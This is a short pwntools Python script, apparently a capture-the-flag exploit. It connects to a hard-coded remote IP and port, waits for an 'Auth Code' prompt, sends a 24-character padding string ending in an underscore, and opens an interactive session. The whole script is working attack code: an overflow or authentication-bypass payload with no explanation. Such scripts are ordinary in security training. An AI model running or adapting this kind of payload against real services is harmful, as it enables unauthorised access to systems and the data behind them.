from pwn import *

p = remote("218.76.35.74",20220)

p.recvuntil(" Auth Code\n\n")
p.sendline("a"*24+'_')
p.interactive()